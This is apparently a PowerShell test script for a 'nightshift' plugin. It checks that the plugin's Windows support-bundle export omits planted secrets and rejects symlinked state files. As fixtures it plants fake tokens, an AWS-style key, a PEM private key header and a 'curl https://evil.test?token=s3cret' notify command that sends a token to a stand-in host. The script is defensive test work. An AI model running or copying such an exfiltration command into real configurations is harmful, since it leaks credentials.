# Portable PowerShell coverage for Windows export-support allowlist.
# Run on macOS or Windows: pwsh -File tests/windows/export-support-logic.ps1
Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'
if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {
    $PSNativeCommandUseErrorActionPreference = $false
}

$repository = Resolve-Path (Join-Path $PSScriptRoot '../..')
$helper = Join-Path $repository 'plugins/nightshift/runtime/windows/export-support.ps1'
$template = Join-Path $repository 'plugins/nightshift/config/nightshift-rules-template.json'
$hostExecutable = (Get-Process -Id $PID).Path
$failures = New-Object 'System.Collections.Generic.List[string]'
$onWin32 = [Environment]::OSVersion.Platform -eq 'Win32NT'

function Expect-True {
    param([bool]$Condition, [string]$Message)
    if (-not $Condition) {
        $failures.Add($Message)
        Write-Host "FAIL: $Message"
    }
}

function Invoke-ExportSupport {
    param([Parameter(Mandatory = $true)][string]$Project)
    $argList = @(
        '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass',
        '-File', $helper, '-Project', $Project
    )
    $stdout = [Collections.Generic.List[string]]::new()
    $stderr = [Collections.Generic.List[string]]::new()
    $previousEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        foreach ($item in @(& $hostExecutable @argList 2>&1)) {
            if ($item -is [Management.Automation.ErrorRecord]) {
                $stderr.Add([string]$item)
            }
            else {
                $stdout.Add([string]$item)
            }
        }
    }
    finally {
        $ErrorActionPreference = $previousEap
    }
    $code = $LASTEXITCODE
    if ($null -eq $code) {
        $code = 1
    }
    return [pscustomobject]@{
        ExitCode = [int]$code
        Stdout = ($stdout -join "`n")
        Stderr = ($stderr -join "`n")
    }
}

$root = Join-Path ([IO.Path]::GetTempPath()) ("ns-export-support-logic-" + [guid]::NewGuid().ToString('N'))
$oldLeak = [Environment]::GetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', 'Process')
try {
    $null = New-Item -ItemType Directory -Path (Join-Path $root '.nightshift') -Force
    $root = (Resolve-Path -LiteralPath $root).Path
    $ns = Join-Path $root '.nightshift'
    Copy-Item -LiteralPath $template -Destination (Join-Path $ns 'rules.json')
    $rulesPath = Join-Path $ns 'rules.json'
    $rules = Get-Content -LiteralPath $rulesPath -Raw | ConvertFrom-Json
    $rules.notifyCommand = 'curl https://evil.test?token=s3cret'
    $rules.expectedEmail = 'owner@example.com'
    $rules | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath $rulesPath -Encoding utf8

    $sid = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
    [IO.File]::WriteAllText((Join-Path $ns '.shift-session'), "$sid`n/Users/victim/transcript.jsonl`n`n`nclaude`n")
    $nonce = 'recovered.nonce.SHOULD-NOT-LEAK'
    [IO.File]::WriteAllLines((Join-Path $ns '.shift-lease'), @('shift-session', 'claude', '2', $nonce, '', ''))

    [IO.File]::WriteAllText((Join-Path $ns 'punch-list.md'), "DO NOT STOP`n")
    [IO.File]::WriteAllText((Join-Path $ns 'owner-notes.md'), "PROMPT: do not copy me`n")

    $homeRoot = ''
    if (-not [string]::IsNullOrEmpty($env:USERPROFILE)) {
        $homeRoot = $env:USERPROFILE
    }
    elseif (-not [string]::IsNullOrEmpty($env:HOME)) {
        $homeRoot = $env:HOME
    }
    $plantedGhp = 'ghp_' + 'PLANTEDTOKENVALUE0000000000000000'
    $plantedAkia = 'AKIA' + 'IOSFODNN7EXAMPLE'
    $plantedPemOpen = '-----BEGIN RSA ' + 'PRIVATE KEY-----'
    $plantedPemClose = '-----END RSA ' + 'PRIVATE KEY-----'
    $log = @(
        'password=supersecret'
        'https://user:hunter2@example.com/hook'
        'https://example.com/x?access_token=abcd'
        $(if ($homeRoot) { Join-Path $homeRoot 'secret-dir/key.pem' } else { '/tmp/secret-dir/key.pem' })
        '/etc/shadow leaked'
        "normal schedule line at $root"
        $plantedGhp
        $plantedAkia
        $plantedPemOpen
        'PLANTEDKEYMATERIAL'
        $plantedPemClose
    ) -join "`n"
    [IO.File]::WriteAllText((Join-Path $ns 'scheduled.log'), $log + "`n")

    [Environment]::SetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', 'should-never-appear', 'Process')
    $exported = Invoke-ExportSupport $root
    Expect-True ($exported.ExitCode -eq 0) "export exits 0 (got $($exported.ExitCode) $($exported.Stderr))"
    Expect-True ($exported.Stdout -match 'Support bundle:') 'export prints the bundle path'
    Expect-True ($exported.Stdout -match 'Included:') 'export names included sections'
    Expect-True ($exported.Stdout -match 'Omitted:') 'export names omitted categories'
    Expect-True ($exported.Stdout -match '(?i)never uploaded') 'export says the bundle is never uploaded'

    $bundleLine = ($exported.Stdout -split "`n" | Where-Object { $_ -match '^Support bundle: ' } | Select-Object -First 1)
    $bundle = if ($bundleLine) { $bundleLine.Substring('Support bundle: '.Length).Trim() } else { '' }
    Expect-True ((-not [string]::IsNullOrEmpty($bundle)) -and (Test-Path -LiteralPath $bundle -PathType Leaf)) `
        "bundle path exists: $bundle"
    if ([string]::IsNullOrEmpty($bundle) -or -not (Test-Path -LiteralPath $bundle -PathType Leaf)) {
        throw 'export-support-logic cannot continue without a bundle'
    }
    $text = [IO.File]::ReadAllText($bundle)

    Expect-True ($text.Contains('Nightshift support bundle')) 'bundle names itself'
    Expect-True ($text.Contains('name: nightshift')) 'bundle names the plugin'
    Expect-True ($text.Contains('validity: valid')) 'bundle reports valid rules'
    Expect-True ($text.Contains('process_lease: valid')) 'bundle reports a valid lease'
    Expect-True ($text.Contains('lease_host: claude')) 'bundle reports the lease host'
    Expect-True ($text.Contains('lease_mode: recovered')) 'bundle reports recovered lease mode'
    Expect-True ($text.Contains('session_record: present')) 'bundle reports the session record without copying it'
    Expect-True ($text -match 'keys:') 'bundle lists rule key names'
    Expect-True ($text.Contains('notifyCommand')) 'bundle lists notifyCommand as a key'
    Expect-True ($text.Contains('== runtime log ==')) 'bundle names the omitted runtime log'
    Expect-True ($text -match '(?m)^omitted\r?$') 'runtime log section is omitted'
    Expect-True (-not $text.Contains('normal schedule line')) 'bundle omits scheduled.log text'
    Expect-True ($text -match 'task: \$(WORKSPACE|WORK_TARGET|HOME)') 'task identity is tokenized'
    Expect-True (-not $exported.Stdout.Contains('Omitted: secrets')) 'footer does not claim secrets were scanned'
    Expect-True ($exported.Stdout -notmatch '(?i)sanitized') 'footer does not claim sanitization'
    Expect-True ($exported.Stdout -notmatch '(?i)secret scanner') 'footer has no secret-scanner sentence'

    foreach ($secret in @(
            'supersecret',
            'hunter2',
            's3cret',
            'owner@example.com',
            'curl https://evil.test',
            $sid,
            'transcript.jsonl',
            'PROMPT: do not copy me',
            'should-never-appear',
            '/etc/shadow',
            'DO NOT STOP',
            $plantedGhp,
            $plantedAkia,
            'PLANTEDKEYMATERIAL',
            'PRIVATE KEY'
        )) {
        Expect-True (-not $text.Contains($secret)) "bundle omits $secret"
    }
    if (-not [string]::IsNullOrEmpty($nonce)) {
        Expect-True (-not $text.Contains($nonce)) 'bundle omits the lease ownership nonce'
    }
    if (-not [string]::IsNullOrEmpty($homeRoot)) {
        $homeSecret = Join-Path $homeRoot 'secret-dir'
        Expect-True (-not $text.Contains($homeSecret)) "bundle omits $homeSecret"
    }
    Expect-True (-not $text.Contains($root)) "bundle omits the raw workspace path $root"

    $plant = Join-Path $ns 'ended-plant'
    [IO.File]::WriteAllText($plant, "plant`n")
    $endedLink = Join-Path $ns '.ended'
    try {
        $null = New-Item -ItemType SymbolicLink -Path $endedLink -Target $plant -ErrorAction Stop
    }
    catch {
        if ($onWin32) {
            Write-Host 'skip symlink ended marker (cannot create)'
        }
        else {
            throw
        }
    }
    if (Test-Path -LiteralPath $endedLink) {
        $linked = Invoke-ExportSupport $root
        Expect-True ($linked.ExitCode -eq 0) `
            "symlink ended export exits 0 (got $($linked.ExitCode) $($linked.Stderr))"
        $linkedLine = ($linked.Stdout -split "`n" | Where-Object { $_ -match '^Support bundle: ' } | Select-Object -First 1)
        $linkedBundle = if ($linkedLine) { $linkedLine.Substring('Support bundle: '.Length).Trim() } else { '' }
        Expect-True ((-not [string]::IsNullOrEmpty($linkedBundle)) -and (Test-Path -LiteralPath $linkedBundle -PathType Leaf)) `
            "symlink ended bundle exists: $linkedBundle"
        if (-not [string]::IsNullOrEmpty($linkedBundle) -and (Test-Path -LiteralPath $linkedBundle -PathType Leaf)) {
            $linkedText = [IO.File]::ReadAllText($linkedBundle)
            Expect-True ($linkedText.Contains('ended: unusable')) 'symlink ended marker is unusable'
            Expect-True (-not $linkedText.Contains('ended: yes')) 'symlink ended marker is not clocked out'
        }
    }

    $sessionPlant = Join-Path $ns 'session-end-plant'
    [IO.File]::WriteAllText($sessionPlant, "plant`n")
    $sessionLink = Join-Path $ns '.session-end'
    try {
        $null = New-Item -ItemType SymbolicLink -Path $sessionLink -Target $sessionPlant -ErrorAction Stop
    }
    catch {
        if ($onWin32) {
            Write-Host 'skip symlink session-end marker (cannot create)'
        }
        else {
            throw
        }
    }
    if (Test-Path -LiteralPath $sessionLink) {
        $sessionExported = Invoke-ExportSupport $root
        Expect-True ($sessionExported.ExitCode -eq 0) `
            "symlink session-end export exits 0 (got $($sessionExported.ExitCode) $($sessionExported.Stderr))"
        $sessionLine = ($sessionExported.Stdout -split "`n" | Where-Object { $_ -match '^Support bundle: ' } | Select-Object -First 1)
        $sessionBundle = if ($sessionLine) { $sessionLine.Substring('Support bundle: '.Length).Trim() } else { '' }
        Expect-True ((-not [string]::IsNullOrEmpty($sessionBundle)) -and (Test-Path -LiteralPath $sessionBundle -PathType Leaf)) `
            "symlink session-end bundle exists: $sessionBundle"
        if (-not [string]::IsNullOrEmpty($sessionBundle) -and (Test-Path -LiteralPath $sessionBundle -PathType Leaf)) {
            $sessionText = [IO.File]::ReadAllText($sessionBundle)
            Expect-True ($sessionText.Contains('session_end: unusable')) 'symlink session-end marker is unusable'
            Expect-True (-not $sessionText.Contains('session_end: yes')) 'symlink session-end marker is not a clean exit'
        }
    }

    $recordPlant = Join-Path $ns 'session-record-plant'
    [IO.File]::WriteAllText($recordPlant, "plant`n")
    $recordLink = Join-Path $ns '.shift-session'
    Remove-Item -LiteralPath $recordLink -Force -ErrorAction SilentlyContinue
    try {
        $null = New-Item -ItemType SymbolicLink -Path $recordLink -Target $recordPlant -ErrorAction Stop
    }
    catch {
        if ($onWin32) {
            Write-Host 'skip symlink shift-session (cannot create)'
        }
        else {
            throw
        }
    }
    if (Test-Path -LiteralPath $recordLink) {
        $recordExported = Invoke-ExportSupport $root
        Expect-True ($recordExported.ExitCode -eq 0) `
            "symlink shift-session export exits 0 (got $($recordExported.ExitCode) $($recordExported.Stderr))"
        $recordLine = ($recordExported.Stdout -split "`n" | Where-Object { $_ -match '^Support bundle: ' } | Select-Object -First 1)
        $recordBundle = if ($recordLine) { $recordLine.Substring('Support bundle: '.Length).Trim() } else { '' }
        Expect-True ((-not [string]::IsNullOrEmpty($recordBundle)) -and (Test-Path -LiteralPath $recordBundle -PathType Leaf)) `
            "symlink shift-session bundle exists: $recordBundle"
        if (-not [string]::IsNullOrEmpty($recordBundle) -and (Test-Path -LiteralPath $recordBundle -PathType Leaf)) {
            $recordText = [IO.File]::ReadAllText($recordBundle)
            Expect-True ($recordText.Contains('session_record: unusable')) 'symlink shift-session is unusable'
            Expect-True (-not $recordText.Contains('session_record: present')) 'symlink shift-session is not a recorded session'
        }
    }

    $armedPlant = Join-Path $ns 'armed-plant'
    [IO.File]::WriteAllText($armedPlant, "plant`n")
    $armedLink = Join-Path $ns '.shift-armed'
    Remove-Item -LiteralPath $armedLink -Force -ErrorAction SilentlyContinue
    try {
        $null = New-Item -ItemType SymbolicLink -Path $armedLink -Target $armedPlant -ErrorAction Stop
    }
    catch {
        if ($onWin32) {
            Write-Host 'skip symlink armed marker (cannot create)'
        }
        else {
            throw
        }
    }
    if (Test-Path -LiteralPath $armedLink) {
        $armedExported = Invoke-ExportSupport $root
        Expect-True ($armedExported.ExitCode -eq 0) `
            "symlink armed export exits 0 (got $($armedExported.ExitCode) $($armedExported.Stderr))"
        $armedLine = ($armedExported.Stdout -split "`n" | Where-Object { $_ -match '^Support bundle: ' } | Select-Object -First 1)
        $armedBundle = if ($armedLine) { $armedLine.Substring('Support bundle: '.Length).Trim() } else { '' }
        Expect-True ((-not [string]::IsNullOrEmpty($armedBundle)) -and (Test-Path -LiteralPath $armedBundle -PathType Leaf)) `
            "symlink armed bundle exists: $armedBundle"
        if (-not [string]::IsNullOrEmpty($armedBundle) -and (Test-Path -LiteralPath $armedBundle -PathType Leaf)) {
            $armedText = [IO.File]::ReadAllText($armedBundle)
            Expect-True ($armedText.Contains('armed: unusable')) 'symlink armed marker is unusable'
            Expect-True (-not $armedText.Contains('armed: yes')) 'symlink armed marker is not armed'
        }
    }

    $watchmanPlant = Join-Path $ns 'watchman-plant'
    [IO.File]::WriteAllText($watchmanPlant, "plant`n")
    $watchmanLink = Join-Path $ns '.watchman'
    Remove-Item -LiteralPath $watchmanLink -Force -ErrorAction SilentlyContinue
    try {
        $null = New-Item -ItemType SymbolicLink -Path $watchmanLink -Target $watchmanPlant -ErrorAction Stop
    }
    catch {
        if ($onWin32) {
            Write-Host 'skip symlink watchman pidfile (cannot create)'
        }
        else {
            throw
        }
    }
    if (Test-Path -LiteralPath $watchmanLink) {
        $watchmanExported = Invoke-ExportSupport $root
        Expect-True ($watchmanExported.ExitCode -eq 0) `
            "symlink watchman pidfile export exits 0 (got $($watchmanExported.ExitCode) $($watchmanExported.Stderr))"
        $watchmanLine = ($watchmanExported.Stdout -split "`n" | Where-Object { $_ -match '^Support bundle: ' } | Select-Object -First 1)
        $watchmanBundle = if ($watchmanLine) { $watchmanLine.Substring('Support bundle: '.Length).Trim() } else { '' }
        Expect-True ((-not [string]::IsNullOrEmpty($watchmanBundle)) -and (Test-Path -LiteralPath $watchmanBundle -PathType Leaf)) `
            "symlink watchman pidfile bundle exists: $watchmanBundle"
        if (-not [string]::IsNullOrEmpty($watchmanBundle) -and (Test-Path -LiteralPath $watchmanBundle -PathType Leaf)) {
            $watchmanText = [IO.File]::ReadAllText($watchmanBundle)
            Expect-True ($watchmanText.Contains('watchman_pidfile: unusable')) 'symlink watchman pidfile is unusable'
            Expect-True (-not $watchmanText.Contains('watchman_pidfile: present')) 'symlink watchman pidfile is not present'
        }
    }
}
finally {
    if ($null -eq $oldLeak) {
        [Environment]::SetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', $null, 'Process')
    }
    else {
        [Environment]::SetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', $oldLeak, 'Process')
    }
    Remove-Item -LiteralPath $root -Recurse -Force -ErrorAction SilentlyContinue
}

if ($failures.Count -gt 0) {
    Write-Host "export-support-logic failed ($($failures.Count)):"
    foreach ($failure in $failures) { Write-Host " - $failure" }
    exit 1
}
Write-Host 'export-support-logic ok'
exit 0
